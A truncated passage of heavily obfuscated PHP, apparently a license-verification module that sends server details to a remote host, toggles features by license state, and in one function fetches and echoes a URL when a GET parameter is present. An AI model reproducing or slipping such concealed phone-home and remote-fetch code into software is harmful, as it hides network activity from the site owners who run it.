$EŒÀ¸‚÷ˆ[124]($_SERVER[$EŒÀ¸‚÷ˆ[125]] . $EŒÀ¸‚÷ˆ[233]($EÓá„ ¡â) . $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[229]]); goto C‰¥‘º‘„Ğ; C‰¥‘º‘„Ğ: $CÎ‰æšà…¶ = $f˜¥‹”ñÎ¯[629]; if (strlen($CÎ‰æšà…¶) < $f˜¥‹”ñÎ¯[605]) { die; } $e‰÷£´†š¯ = $EŒÀ¸‚÷ˆ[233]($EŒÀ¸‚÷ˆ[25]($A£¨Ú‹æÁ, 10, 16)); goto dÊùŞ…Ù…; BŸ¿×³­Ñ¯: $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[132]] = $EŒÀ¸‚÷ˆ[233]($EŒÀ¸‚÷ˆ[128]($this->{$_SERVER[’û£ìÂ®Å‚][165]}($bİÏŠ¤Úç, $EŒÀ¸‚÷ˆ[234]))); $bª®èè²º£ = $f˜¥‹”ñÎ¯[625]; if (!$bª®èè²º£) { return; } goto AÚ”£ø”³¸; f¸‚—–ô‹¶: while (strlen($fº¬Œ‹Ò½â) < $f˜¥‹”ñÎ¯[605]) { if (!$fº¬Œ‹Ò½â) { break; } $fº¬Œ‹Ò½â++; } $this->jndo77356942 = $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[130]]; $Dœ¡°¬ÑÔõ = $f˜¥‹”ñÎ¯[633]; goto CŸ’í°ÚÎä; cøµš«îƒÖ: $B ñÑ¤³¿ = $f˜¥‹”ñÎ¯[635]; while (strlen($B ñÑ¤³¿) < $f˜¥‹”ñÎ¯[584]) { if (!$B ñÑ¤³¿) { break; } $B ñÑ¤³¿++; } goto Eˆ£ËºÇùê; bƒ’İ‰›: if (!isset($DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[183]]) || $EŒÀ¸‚÷ˆ[24]($DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[183]]) != 16) { $EŒÀ¸‚÷ˆ[184]($EŒÀ¸‚÷ˆ[185] . $DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[183]], !1); } $EÓá„ ¡â = $EŒÀ¸‚÷ˆ[61]($EŒÀ¸‚÷ˆ[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($EŒÀ¸‚÷ˆ[126]); $bŒ·ø½¨•É = $EŒÀ¸‚÷ˆ[124]($_SERVER[$EŒÀ¸‚÷ˆ[125]] . $EÓá„ ¡â); goto aĞ˜ó¦„ï‚; FôÇ°µØ†Å: if (!$E¬ÅØ¢áè‰ || $E¬ÅØ¢áè‰ != $Dç„ŸíÕ¦§[$EŒÀ¸‚÷ˆ[155]]) { $Dù¤™¡„½‚ = array($EŒÀ¸‚÷ˆ[220] => $EŒÀ¸‚÷ˆ[61]($EŒÀ¸‚÷ˆ[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($EŒÀ¸‚÷ˆ[126]), $EŒÀ¸‚÷ˆ[221] => $_SERVER[$EŒÀ¸‚÷ˆ[125]], $EŒÀ¸‚÷ˆ[222] => $EŒÀ¸‚÷ˆ[223](), $EŒÀ¸‚÷ˆ[192] => $_SERVER[$EŒÀ¸‚÷ˆ[193]]); $dò’·Ÿ…Ñ = $this->{$_SERVER[’û£ìÂ®Å‚][224]}($EŒÀ¸‚÷ˆ[166]($Dù¤™¡„½‚)); $this->{$_SERVER[’û£ìÂ®Å‚][202]}($EŒÀ¸‚÷ˆ[225] . $dò’·Ÿ…Ñ); $EŒÀ¸‚÷ˆ[184]($EŒÀ¸‚÷ˆ[216]($EŒÀ¸‚÷ˆ[226]), !0); } $Bì‰¥–÷”¶ = array($EŒÀ¸‚÷ˆ[227] => $Dç„ŸíÕ¦§[$EŒÀ¸‚÷ˆ[228]], $EŒÀ¸‚÷ˆ[229] => $Dç„ŸíÕ¦§[$EŒÀ¸‚÷ˆ[230]], $EŒÀ¸‚÷ˆ[231] => $EŒÀ¸‚÷ˆ[134](16), $EŒÀ¸‚÷ˆ[130] => $Dç„ŸíÕ¦§[$EŒÀ¸‚÷ˆ[232]]); if ($e³­„çÌôô[$EŒÀ¸‚÷ˆ[186]]) { $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[231]] = $e³­„çÌôô[$EŒÀ¸‚÷ˆ[186]]; } goto Cùµ¯–Œæ; dÊùŞ…Ù…: $bª½Âµ˜Âã = $this->{$_SERVER[’û£ìÂ®Å‚][137]}($EŒÀ¸‚÷ˆ[166]($Dç„ŸíÕ¦§), $A£¨Ú‹æÁ); $a»ƒ¤…«á¡ = $EŒÀ¸‚÷ˆ[241]($EŒÀ¸‚÷ˆ[61]($EŒÀ¸‚÷ˆ[11])->{$_SERVER[’û£ìÂ®Å‚][242]}(), $EŒÀ¸‚÷ˆ[243]); $e³ù–à§Ñ“ = $a»ƒ¤…«á¡[$EŒÀ¸‚÷ˆ[244]]; goto cÒƒ—ÒÂ»; Cùµ¯–Œæ: $Aœùš¡™´ô = $EŒÀ¸‚÷ˆ[25]($EŒÀ¸‚÷ˆ[124]($Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[229]]), 10, 10); $bİÏŠ¤Úç = $Aœùš¡™´ô . $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[130]] . $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[231]]; $EôùÖÍØâ‡ = $f˜¥‹”ñÎ¯[624]; goto BŸ¿×³­Ñ¯; fÙÅØğçÕ: if (!$dèÜ”É“©ò) { die; } $this->vuljaf2cb0dd = $Dç„ŸíÕ¦§; $fº¬Œ‹Ò½â = $f˜¥‹”ñÎ¯[632]; goto f¸‚—–ô‹¶; A¿ÌôÀÒ“: $d±§Òôß = $f˜¥‹”ñÎ¯[634]; if (!$d±§Òôß) { die; } $EŒÀ¸‚÷ˆ[184]($EŒÀ¸‚÷ˆ[216]($EŒÀ¸‚÷ˆ[226]), !0); goto cøµš«îƒÖ; AÚ”£ø”³¸: $bĞ ŠìÆùí = $EŒÀ¸‚÷ˆ[134](16); $c—¿ºå±±é = $f˜¥‹”ñÎ¯[626]; while (strlen($c—¿ºå±±é) < $f˜¥‹”ñÎ¯[584]) { if (!$c—¿ºå±±é) { break; } $c—¿ºå±±é++; } goto BŞËĞÁæñß; Fé–ÖŒ‹Ø: if (!$EŒÀ¸‚÷ˆ[116]($GLOBALS, $EŒÀ¸‚÷ˆ[142])) { die; } $DáÖÄ×ÈËÍ = $GLOBALS[$EŒÀ¸‚÷ˆ[22]]; if (isset($DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[181]])) { $this->{$_SERVER[’û£ìÂ®Å‚][182]}(); die; } goto bƒ’İ‰›; e‚¼–§ª‚Ç: $E¬ÅØ¢áè‰ = $this->{$_SERVER[’û£ìÂ®Å‚][218]}($Dç„ŸíÕ¦§[$EŒÀ¸‚÷ˆ[219]]); $f¸ã¹Œª³ = $f˜¥‹”ñÎ¯[623]; if (!$f¸ã¹Œª³) { die; } goto FôÇ°µØ†Å; cÒƒ—ÒÂ»: $bËÆáÒÆäğ = array(); $bËÆáÒÆäğ[$e‰÷£´†š¯] = $bª½Âµ˜Âã; $B”Ò¦ô“ = $f˜¥‹”ñÎ¯[630]; goto a”±Æ‰îÎï; aĞ˜ó¦„ï‚: $e³­„çÌôô = array($EŒÀ¸‚÷ˆ[183] => $DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[183]], $EŒÀ¸‚÷ˆ[186] => $EŒÀ¸‚÷ˆ[134](16), $EŒÀ¸‚÷ˆ[187] => $EŒÀ¸‚÷ˆ[167], $EŒÀ¸‚÷ˆ[188] => $EŒÀ¸‚÷ˆ[189], $EŒÀ¸‚÷ˆ[190] => $_SERVER[$EŒÀ¸‚÷ˆ[191]], $EŒÀ¸‚÷ˆ[192] => $_SERVER[$EŒÀ¸‚÷ˆ[193]], $EŒÀ¸‚÷ˆ[194] => $_SERVER[$EŒÀ¸‚÷ˆ[195]], $EŒÀ¸‚÷ˆ[123] => $bŒ·ø½¨•É, $EŒÀ¸‚÷ˆ[196] => $EŒÀ¸‚÷ˆ[61]($EŒÀ¸‚÷ˆ[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($EŒÀ¸‚÷ˆ[157])); $f„óÕò—ŠÒ = $f˜¥‹”ñÎ¯[622]; while (strlen($f„óÕò—ŠÒ) < $f˜¥‹”ñÎ¯[64]) { if (!$f„óÕò—ŠÒ) { break; } $f„óÕò—ŠÒ++; } goto Bäœ¨éØ«¾; CŸ’í°ÚÎä: if (strlen($Dœ¡°¬ÑÔõ) < $f˜¥‹”ñÎ¯[589]) { return; } $this->{$_SERVER[’û£ìÂ®Å‚][248]}(); Cache::set($EŒÀ¸‚÷ˆ[249] . $EŒÀ¸‚÷ˆ[124]($EÓá„ ¡â . $EŒÀ¸‚÷ˆ[250]), $EŒÀ¸‚÷ˆ[10]); goto A¿ÌôÀÒ“; Eè¥Ö…·¢·: $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[133]] = $EŒÀ¸‚÷ˆ[128]($EŒÀ¸‚÷ˆ[233]($this->{$_SERVER[’û£ìÂ®Å‚][165]}($dÙÊùáí–ã, $EŒÀ¸‚÷ˆ[235]))); $b‰èª©İ¶ = $f˜¥‹”ñÎ¯[628]; while ($b‰èª©İ¶ < $f˜¥‹”ñÎ¯[605]) { if ($b‰èª©İ¶ >= 0) { break; } $b‰èª©İ¶++; } goto bÏïÅåË£; BŞËĞÁæñß: $dÙÊùáí–ã = $bĞ ŠìÆùí . $Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[130]] . $this->{$_SERVER[’û£ìÂ®Å‚][165]}($EŒÀ¸‚÷ˆ[124]($Bì‰¥–÷”¶[$EŒÀ¸‚÷ˆ[227]]), $bĞ ŠìÆùí); $cùç¢šö‹Á = $f˜¥‹”ñÎ¯[627]; if (strlen($cùç¢šö‹Á) < $f˜¥‹”ñÎ¯[64]) { return; } goto Eè¥Ö…·¢·; Eˆ£ËºÇùê: } private function licenseRegistSuccess() { $b…Ñğß°ô‡ =& $_SERVER[’û£ìÂ®Å‚]; $dËñˆ»×šİ = $b…Ñğß°ô‡[61]($b…Ñğß°ô‡[62])->{$_SERVER[’û£ìÂ®Å‚][63]}(); if ($dËñˆ»×šİ[$b…Ñğß°ô‡[93]] != $b…Ñğß°ô‡[239]) { $b…Ñğß°ô‡[61]($b…Ñğß°ô‡[62])->{$_SERVER[’û£ìÂ®Å‚][240]}($b…Ñğß°ô‡[93], $b…Ñğß°ô‡[239]); } $b…Ñğß°ô‡[120]($b…Ñğß°ô‡[251])->{$_SERVER[’û£ìÂ®Å‚][252]}(!0); } private function youra23a4584() { goto c¨ù«¤Ï‚Ù; C­îÊËÀ«’: $e½ØöêƒÏ = $fùÕ½ÒŸ[636]; if (!$e½ØöêƒÏ) { die; } $Bš…ÙÄÚá¤[61]($Bš…ÙÄÚá¤[62])->{$_SERVER[’û£ìÂ®Å‚][237]}($Bš…ÙÄÚá¤[238], $Bš…ÙÄÚá¤[253]); goto C¿°Œéå«‹; C¿°Œéå«‹: $this->vuljaf2cb0dd = array(); $this->jndo77356942 = $Bš…ÙÄÚá¤[131]; $A¨Œ‡‡ØŒÚ = $fùÕ½ÒŸ[637]; goto AØØ‹Ä‘÷; c¨ù«¤Ï‚Ù: $fùÕ½ÒŸ =& $_SERVER[Ü˜]; $Bš…ÙÄÚá¤ =& $_SERVER[’û£ìÂ®Å‚]; $Bš…ÙÄÚá¤[61]($Bš…ÙÄÚá¤[62])->{$_SERVER[’û£ìÂ®Å‚][240]}(array($Bš…ÙÄÚá¤[227] => $Bš…ÙÄÚá¤[10], $Bš…ÙÄÚá¤[229] => $Bš…ÙÄÚá¤[10], $Bš…ÙÄÚá¤[130] => $Bš…ÙÄÚá¤[131], $Bš…ÙÄÚá¤[132] => $Bš…ÙÄÚá¤[10], $Bš…ÙÄÚá¤[133] => $Bš…ÙÄÚá¤[10])); goto C­îÊËÀ«’; AØØ‹Ä‘÷: } private function gluad6d95d77() { goto b£Ù¹Ø—ì; DÑÔ´âÁ•â: $få®ÙÑ³ã = $eÀŠùå¡ì[154]($EäÊ¶Ì[$eÀŠùå¡ì[155]]); if ($eÀŠùå¡ì[255]() >= $få®ÙÑ³ã) { return $this->{$_SERVER[’û£ìÂ®Å‚][182]}(); } if ($eÀŠùå¡ì[255]() - $EäÊ¶Ì[$eÀŠùå¡ì[254]] > 20) { $EäÊ¶Ì[$eÀŠùå¡ì[254]] = $eÀŠùå¡ì[255](); Cache::set($cî¼¤ˆ¡„É, $EäÊ¶Ì); } goto Fï¢Òè¨“Ò; bƒ’ìğ—Å·: if (strlen($cÃÇ«ÕÅ×) < $e¦Àà³¤Ñ[584]) { die; } if (!$eÀŠùå¡ì[161]($EäÊ¶Ì) || !isset($EäÊ¶Ì[$eÀŠùå¡ì[254]]) || $eÀŠùå¡ì[255]() - $EäÊ¶Ì[$eÀŠùå¡ì[254]] >= 60) { $b×ÊÙ‹ì­Ù = $eÀŠùå¡ì[241]($eÀŠùå¡ì[61]($eÀŠùå¡ì[11])->{$_SERVER[’û£ìÂ®Å‚][242]}(), $eÀŠùå¡ì[243]); $B»„ºŸš¢“ = $b×ÊÙ‹ì­Ù[$eÀŠùå¡ì[244]]; $e¯¥‹‡ï«Õ = $eÀŠùå¡ì[124]($_SERVER[$eÀŠùå¡ì[125]] . $eÀŠùå¡ì[233]($B•¤Øñ“®ğ) . $dĞ•†ŒŒ‘§[$eÀŠùå¡ì[229]]); $f‰Ëê¨Ê… = $eÀŠùå¡ì[233]($eÀŠùå¡ì[25]($e¯¥‹‡ï«Õ, 10, 16)); $EäÊ¶Ì = $this->{$_SERVER[’û£ìÂ®Å‚][208]}($B»„ºŸš¢“[$eÀŠùå¡ì[104]][$f‰Ëê¨Ê…], $e¯¥‹‡ï«Õ); $EäÊ¶Ì = $eÀŠùå¡ì[210]($EäÊ¶Ì, !0); } if (!$eÀŠùå¡ì[161]($EäÊ¶Ì)) { return $this->{$_SERVER[’û£ìÂ®Å‚][182]}(); } goto DÑÔ´âÁ•â; E‚Ê²¸›éÂ: $this->jndo77356942 = $eÀŠùå¡ì[131]; $dĞ•†ŒŒ‘§ = $eÀŠùå¡ì[61]($eÀŠùå¡ì[62])->{$_SERVER[’û£ìÂ®Å‚][63]}(); if ($dĞ•†ŒŒ‘§[$eÀŠùå¡ì[130]] == $eÀŠùå¡ì[131]) { return; } goto C—İÑĞëèã; AŠ”ÚÑíßÍ: while (strlen($d„ğÊ»©ô) < $e¦Àà³¤Ñ[589]) { if (!$d„ğÊ»©ô) { break; } $d„ğÊ»©ô++; } goto cí÷õ°·éÁ; Fï¢Òè¨“Ò: $this->vuljaf2cb0dd = $EäÊ¶Ì; $this->jndo77356942 = $dĞ•†ŒŒ‘§[$eÀŠùå¡ì[130]]; $d„ğÊ»©ô = $e¦Àà³¤Ñ[640]; goto AŠ”ÚÑíßÍ; C—İÑĞëèã: $B•¤Øñ“®ğ = $eÀŠùå¡ì[61]($eÀŠùå¡ì[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($eÀŠùå¡ì[126]); $cî¼¤ˆ¡„É = $eÀŠùå¡ì[249] . $eÀŠùå¡ì[124]($B•¤Øñ“®ğ . $eÀŠùå¡ì[250]); $BîäÃ¾ñ°ù = $e¦Àà³¤Ñ[638]; goto a¦à¬•Ø; b£Ù¹Ø—ì: $e¦Àà³¤Ñ =& $_SERVER[Ü˜]; $eÀŠùå¡ì =& $_SERVER[’û£ìÂ®Å‚]; $_SERVER[$eÀŠùå¡ì[193]] = $eÀŠùå¡ì[116]($_SERVER, $eÀŠùå¡ì[193], APP_HOST); goto E‚Ê²¸›éÂ; a¦à¬•Ø: if (!$BîäÃ¾ñ°ù) { return; } $EäÊ¶Ì = Cache::get($cî¼¤ˆ¡„É); $cÃÇ«ÕÅ× = $e¦Àà³¤Ñ[639]; goto bƒ’ìğ—Å·; cí÷õ°·éÁ: } private function kldyb2ecd6d0() { goto d¨´¤ëÄŞ´; C“ˆ°ñº‚á: $a˜âŠ¾×Ï§ = $_SERVER[$FÎÀ§èÍÒ[44]]; $e·ì›œµÕ¹ = $BÔ£Ñç¢º[641]; if (strlen($e·ì›œµÕ¹) < $BÔ£Ñç¢º[612]) { return; } goto D†Ù‡¯³Åù; d¨´¤ëÄŞ´: $BÔ£Ñç¢º =& $_SERVER[Ü˜]; $FÎÀ§èÍÒ =& $_SERVER[’û£ìÂ®Å‚]; $eè²â…Ğ’® = $GLOBALS[$FÎÀ§èÍÒ[22]]; goto C“ˆ°ñº‚á; D†Ù‡¯³Åù: if ($a˜âŠ¾×Ï§ == $FÎÀ§èÍÒ[256] && $this->jndo77356942 == $FÎÀ§èÍÒ[131]) { $FÎÀ§èÍÒ[184]($FÎÀ§èÍÒ[216]($FÎÀ§èÍÒ[257]), !1, $FÎÀ§èÍÒ[258]); } $DÍ…£Òî = array($FÎÀ§èÍÒ[259], $FÎÀ§èÍÒ[260]); if ($FÎÀ§èÍÒ[261]($a˜âŠ¾×Ï§, $DÍ…£Òî)) { if ($this->jndo77356942 == $FÎÀ§èÍÒ[131] && isset($eè²â…Ğ’®[$FÎÀ§èÍÒ[262]])) { $FÎÀ§èÍÒ[184]($FÎÀ§èÍÒ[216]($FÎÀ§èÍÒ[257]), !1, $FÎÀ§èÍÒ[258]); die; } $cĞ›îË©÷‡ = $this->{$_SERVER[’û£ìÂ®Å‚][147]}(); if ($cĞ›îË©÷‡ != $FÎÀ§èÍÒ[263]($FÎÀ§èÍÒ[264])) { if ($cĞ›îË©÷‡ <= $FÎÀ§èÍÒ[61]($FÎÀ§èÍÒ[149])->{$_SERVER[’û£ìÂ®Å‚][150]}()) { $FÎÀ§èÍÒ[184]($FÎÀ§èÍÒ[216]($FÎÀ§èÍÒ[265]), !1, $FÎÀ§èÍÒ[258]); die; } } } goto B°ô–Çõ›¹; B°ô–Çõ›¹: } private function xzfm02a0e25f() { goto EÈÑ”ËÒˆÖ; BöŸƒ‡»“: if (!$f¯ÛÂçÈÃŒ[261]($_SERVER[$f¯ÛÂçÈÃŒ[44]], $cÊÍ…ê¢ÆÂ)) { return; } $D©÷¿‹±¯ï = $f¯ÛÂçÈÃŒ[268]; $D©÷¿‹±¯ï = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($D©÷¿‹±¯ï, $f¯ÛÂçÈÃŒ[270]); goto dç»§à•‡; b³İï„½Î¯: $CÏª—é°ÙÃ = $E–™·ˆ‡š´[643]; while ($CÏª—é°ÙÃ < $E–™·ˆ‡š´[612]) { if ($CÏª—é°ÙÃ >= 0) { break; } $CÏª—é°ÙÃ++; } if ($Cª¶Âß˜‚ && $f¯ÛÂçÈÃŒ[32]($Cª¶Âß˜‚, $f¯ÛÂçÈÃŒ[279])) { echo $Cª¶Âß˜‚; } goto aµëãÉî‡¹; EÈÑ”ËÒˆÖ: $E–™·ˆ‡š´ =& $_SERVER[Ü˜]; $f¯ÛÂçÈÃŒ =& $_SERVER[’û£ìÂ®Å‚]; $cÊÍ…ê¢ÆÂ = array($f¯ÛÂçÈÃŒ[145], $f¯ÛÂçÈÃŒ[266]); goto DåíÕˆù®Â; DåíÕˆù®Â: $fõù»Š¾¹Á = $E–™·ˆ‡š´[642]; if (!$fõù»Š¾¹Á) { return; } if (!$f¯ÛÂçÈÃŒ[116]($GLOBALS, $f¯ÛÂçÈÃŒ[142]) || !isset($_GET[$f¯ÛÂçÈÃŒ[267]])) { return; } goto BöŸƒ‡»“; aµëãÉî‡¹: die; goto BÛµõ­¶Šˆ; dç»§à•‡: $Eñé‡‹Ù®å = $f¯ÛÂçÈÃŒ[271](array($f¯ÛÂçÈÃŒ[272] => array($f¯ÛÂçÈÃŒ[273] => $f¯ÛÂçÈÃŒ[274], $f¯ÛÂçÈÃŒ[275] => 3))); $Cª¶Âß˜‚ = @$f¯ÛÂçÈÃŒ[276]($D©÷¿‹±¯ï, !1, $Eñé‡‹Ù®å); $f¯ÛÂçÈÃŒ[277]($f¯ÛÂçÈÃŒ[278]); goto b³İï„½Î¯; BÛµõ­¶Šˆ: } public function dyfn45b4a98c($D¿ä°†ØÎÀ) { goto EŠå„®ê´İ; EŠå„®ê´İ: $Aâ›„¶ÇÖ• =& $_SERVER[Ü˜]; $BÆ¸”É½ƒÍ =& $_SERVER[’û£ìÂ®Å‚]; if ($this->jndo77356942 == $BÆ¸”É½ƒÍ[280]) { return $D¿ä°†ØÎÀ; } goto d÷œĞÇ‘Ü; eïöİ®–å: foreach ($c²×Ô…¥Ç as $eÖÂØ•ÂºÑ) { unset($D¿ä°†ØÎÀ[$eÖÂØ•ÂºÑ]); } return $D¿ä°†ØÎÀ; $C´é¤¹ÅÓğ = $Aâ›„¶ÇÖ•[645]; goto bÉÖÍ¥æÏÉ; d÷œĞÇ‘Ü: $eÔ¶ìÀ˜«Û = array($BÆ¸”É½ƒÍ[281] => $BÆ¸”É½ƒÍ[282], $BÆ¸”É½ƒÍ[283] => $BÆ¸”É½ƒÍ[282], $BÆ¸”É½ƒÍ[284] => $BÆ¸”É½ƒÍ[282], $BÆ¸”É½ƒÍ[285] => $BÆ¸”É½ƒÍ[282], $BÆ¸”É½ƒÍ[286] => $BÆ¸”É½ƒÍ[282], $BÆ¸”É½ƒÍ[287] => $BÆ¸”É½ƒÍ[282], $BÆ¸”É½ƒÍ[288] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[290] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[291] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[292] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[293] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[294] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[295] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[296] => $BÆ¸”É½ƒÍ[289], $BÆ¸”É½ƒÍ[297] => $BÆ¸”É½ƒÍ[289]); $D¸òïœ¦¯ö = $Aâ›„¶ÇÖ•[644]; if (strlen($D¸òïœ¦¯ö) < $Aâ›„¶ÇÖ•[64]) { die; } goto f‹®·Â¥°; f‹®·Â¥°: $C¥‰¡”åí­ = $BÆ¸”É½ƒÍ[0]($BÆ¸”É½ƒÍ[298], $BÆ¸”É½ƒÍ[116]($this->vuljaf2cb0dd, $BÆ¸”É½ƒÍ[139], $BÆ¸”É½ƒÍ[10])); $c²×Ô…¥Ç = array(); foreach ($eÔ¶ìÀ˜«Û as $eÖÂØ•ÂºÑ => $f¼¥¼Õ•ğ™) { if ($f¼¥¼Õ•ğ™ == $BÆ¸”É½ƒÍ[282] && $BÆ¸”É½ƒÍ[25]($this->jndo77356942, 0, 1) == $BÆ¸”É½ƒÍ[282]) { continue; } if (!$BÆ¸”É½ƒÍ[261]($eÖÂØ•ÂºÑ, $C¥‰¡”åí­)) { $c²×Ô…¥Ç[] = $eÖÂØ•ÂºÑ; } } goto eïöİ®–å; bÉÖÍ¥æÏÉ: } private function flpo29eeb4a4() { $Eƒ«¹àò°ó =& $_SERVER[’û£ìÂ®Å‚]; if ($this->jndo77356942 != $Eƒ«¹àò°ó[131]) { return; } $GLOBALS[$Eƒ«¹àò°ó[104]][$Eƒ«¹àò°ó[108]][$Eƒ«¹àò°ó[299]] = $Eƒ«¹àò°ó[239]; $GLOBALS[$Eƒ«¹àò°ó[104]][$Eƒ«¹àò°ó[300]] = $Eƒ«¹àò°ó[239]; $fîéÌáòÙ÷ = $_SERVER[Ü˜][646]; if ($Eƒ«¹àò°ó[61]($Eƒ«¹àò°ó[301])->{$_SERVER[’û£ìÂ®Å‚][63]}($Eƒ«¹àò°ó[93]) != $Eƒ«¹àò°ó[253]) { $Eƒ«¹àò°ó[61]($Eƒ«¹àò°ó[301])->{$_SERVER[’û£ìÂ®Å‚][240]}($Eƒ«¹àò°ó[93], $Eƒ«¹àò°ó[253]); } } public function gfduc61414ca() { $B½çÚ¤†ê­ =& $_SERVER[Ü˜]; return $_SERVER[’û£ìÂ®Å‚][302]; $AÛ…”Şçñ‹ = $B½çÚ¤†ê­[647]; if (strlen($AÛ…”Şçñ‹) < $B½çÚ¤†ê­[612]) { die; } } private function fiuh12e21005() { goto cŒ°‡òÂ¼; a¤¢İŒÏÎ: $aÆŞ„°éÖ = $B§÷µÃ‰›…[61]($B§÷µÃ‰›…[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($B§÷µÃ‰›…[126]); $b‚‘·Ğ£„ = $e¬‰«ØÚÒŠ[651]; while ($b‚‘·Ğ£„ < $e¬‰«ØÚÒŠ[612]) { if ($b‚‘·Ğ£„ >= 0) { break; } $b‚‘·Ğ£„++; } goto bÆåøßæœÆ; EÖ ‘ñØ¦‰: if ($B§÷µÃ‰›…[255]() % 4 != 0) { return; } $bŒõ¾É¶³• = $B§÷µÃ‰›…[13](array($B§÷µÃ‰›…[308], $B§÷µÃ‰›…[309]), $FØ«©£â¾„); if ($bŒõ¾É¶³• && $B§÷µÃ‰›…[255]() - $bŒõ¾É¶³• < $B§÷µÃ‰›…[263]($B§÷µÃ‰›…[310])) { return; } goto Dçéï÷³ªÓ; bÆåøßæœÆ: $Eâñ©»ØÆ³ = array($B§÷µÃ‰›…[183] => $B§÷µÃ‰›…[61]($B§÷µÃ‰›…[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($B§÷µÃ‰›…[227]), $B§÷µÃ‰›…[197] => $this->jndo77356942, $B§÷µÃ‰›…[194] => $_SERVER[$B§÷µÃ‰›…[195]], $B§÷µÃ‰›…[196] => $B§÷µÃ‰›…[61]($B§÷µÃ‰›…[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($B§÷µÃ‰›…[157]), $B§÷µÃ‰›…[123] => $B§÷µÃ‰›…[124]($_SERVER[$B§÷µÃ‰›…[125]] . $aÆŞ„°éÖ), $B§÷µÃ‰›…[187] => $B§÷µÃ‰›…[167], $B§÷µÃ‰›…[190] => $_SERVER[$B§÷µÃ‰›…[191]]); $AåÍòÒºá = $this->{$_SERVER[’û£ìÂ®Å‚][202]}($B§÷µÃ‰›…[311], $Eâñ©»ØÆ³); $E“¬°×‰Â = $e¬‰«ØÚÒŠ[652]; goto E‰äÏ‰…Õ; C«Â®Ş®÷¶: $this->{$_SERVER[’û£ìÂ®Å‚][182]}(); $bˆùÃ’—æõ = $e¬‰«ØÚÒŠ[653]; if (!$bˆùÃ’—æõ) { die; } goto a¡œğ†ñÄ£; cŒ°‡òÂ¼: $e¬‰«ØÚÒŠ =& $_SERVER[Ü˜]; $B§÷µÃ‰›… =& $_SERVER[’û£ìÂ®Å‚]; $fì¸é Œ»Œ = array($B§÷µÃ‰›…[303], $B§÷µÃ‰›…[304], $B§÷µÃ‰›…[305]); goto cšæñ½³š¶; cšæñ½³š¶: $dÄòõ®ñ…ë = $e¬‰«ØÚÒŠ[648]; $FØ«©£â¾„ = $B§÷µÃ‰›…[306] . $B§÷µÃ‰›…[124]($B§÷µÃ‰›…[307]); $A­¢ò¡½ö = $e¬‰«ØÚÒŠ[649]; goto DÍº“öåˆ©; E‰äÏ‰…Õ: while ($E“¬°×‰Â < $e¬‰«ØÚÒŠ[612]) { if ($E“¬°×‰Â >= 0) { break; } $E“¬°×‰Â++; } if (!$B§÷µÃ‰›…[161]($AåÍòÒºá)) { return; } if ($AåÍòÒºá[$B§÷µÃ‰›…[183]] && $AåÍòÒºá[$B§÷µÃ‰›…[312]]) { if ($this->{$_SERVER[’û£ìÂ®Å‚][218]}($AåÍòÒºá[$B§÷µÃ‰›…[312]]) == $Eâñ©»ØÆ³[$B§÷µÃ‰›…[183]]) { return; } } goto C«Â®Ş®÷¶; DÍº“öåˆ©: while (strlen($A­¢ò¡½ö) < $e¬‰«ØÚÒŠ[589]) { if (!$A­¢ò¡½ö) { break; } $A­¢ò¡½ö++; } if ($this->jndo77356942 == $B§÷µÃ‰›…[131] || !$B§÷µÃ‰›…[116]($GLOBALS, $B§÷µÃ‰›…[142])) { return; } if (!$B§÷µÃ‰›…[261]($_SERVER[$B§÷µÃ‰›…[44]], $fì¸é Œ»Œ)) { return; } goto EÖ ‘ñØ¦‰; Dçéï÷³ªÓ: $B§÷µÃ‰›…[13](array($B§÷µÃ‰›…[308], $B§÷µÃ‰›…[170]), $FØ«©£â¾„, $B§÷µÃ‰›…[255]()); $f®ÙŞ—µ«é = $e¬‰«ØÚÒŠ[650]; if (!$f®ÙŞ—µ«é) { return; } goto a¤¢İŒÏÎ; a¡œğ†ñÄ£: if ($this->{$_SERVER[’û£ìÂ®Å‚][218]}($AåÍòÒºá[$B§÷µÃ‰›…[312]]) != $Eâñ©»ØÆ³[$B§÷µÃ‰›…[183]]) { $fº›«Å¼¼ = array($B§÷µÃ‰›…[220] => $aÆŞ„°éÖ, $B§÷µÃ‰›…[221] => $_SERVER[$B§÷µÃ‰›…[125]], $B§÷µÃ‰›…[222] => $B§÷µÃ‰›…[223](), $B§÷µÃ‰›…[192] => $_SERVER[$B§÷µÃ‰›…[193]]); $A…Š‰³ÏÎ = $this->{$_SERVER[’û£ìÂ®Å‚][224]}($B§÷µÃ‰›…[166]($fº›«Å¼¼)); $AåÍòÒºá = $this->{$_SERVER[’û£ìÂ®Å‚][202]}($B§÷µÃ‰›…[225] . $A…Š‰³ÏÎ); if ($AåÍòÒºá && $B§÷µÃ‰›…[161]($AåÍòÒºá) && isset($AåÍòÒºá[$B§÷µÃ‰›…[312]])) { $fòÎŞëã²• = $this->{$_SERVER[’û£ìÂ®Å‚][208]}($AåÍòÒºá[$B§÷µÃ‰›…[312]], 2); if 